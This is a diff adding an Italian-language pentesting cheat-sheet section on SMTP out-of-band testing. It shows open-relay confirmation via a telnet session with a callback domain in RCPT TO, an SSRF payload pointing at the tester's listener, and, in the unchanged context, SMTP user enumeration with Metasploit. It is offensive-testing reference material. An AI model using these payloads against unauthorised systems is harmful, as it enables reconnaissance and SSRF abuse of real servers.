@@ -56,6 +56,36 @@ telnet <IP> 25                                       # Connessione diretta
 msfconsole > search smtp_enum > use 0 > set RHOSTS <IP> > set USER_FILE wordlist.txt > run
 ```
 
+## OOB con catch
+
+Se il server SMTP è un Open Relay, puoi usare catch per confermare SSRF
+o per testare se il server invia effettivamente email verso l'esterno.
+
+```bash
+catch tcp on --port 4444
+catch dns on
+catch dns token
+```
+
+### Conferma Open Relay via callback
+
+```bash
+telnet <TARGET> 25
+  > EHLO test
+  > MAIL FROM: <test@test.com>
+  > RCPT TO: <x@<TOKEN>.<LHOST>>
+  > QUIT
+```
+→ `catch logs dns` mostra la query DNS se il server tenta di risolvere il dominio.
+
+### SSRF via SMTP (se l'app invia email con URL controllabili)
+
+Se un'applicazione web prende un URL come input per email (es. "invia link"):
+```
+url=http://<LHOST>:4444/ssrf
+```
+→ `catch logs tcp` conferma il callback.
+
 ## Tool consigliati
 
 *Installa con `use <tool>` + `install`*
